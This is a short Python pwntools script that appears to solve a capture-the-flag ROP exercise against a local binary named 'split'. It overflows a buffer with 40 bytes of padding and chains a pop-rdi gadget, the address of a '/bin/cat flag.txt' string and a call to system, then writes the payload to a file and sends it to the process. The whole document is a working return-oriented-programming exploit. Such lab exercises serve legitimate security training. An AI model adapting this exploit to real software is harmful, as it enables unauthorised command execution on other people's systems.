import sys
from pwn import *

elf = ELF('split')
io = process(elf.path)


pop_rdi_addr = 0x4007c3
cat_addr = 0x601060 # /bin/cat flag.txt addr
system_addr = 0x40074b # call system

rop_chain = p64(pop_rdi_addr)
rop_chain += p64(cat_addr)
rop_chain += p64(system_addr)

exploit = b'A' * 40 + rop_chain
#exploit += b'X' * (0x60 - len(exploit)) # the read takes in 0x60 bytes total

with open('./payload', 'wb') as payload_fh:
    payload_fh.write(exploit)

io.sendline(exploit)
io.interactive()
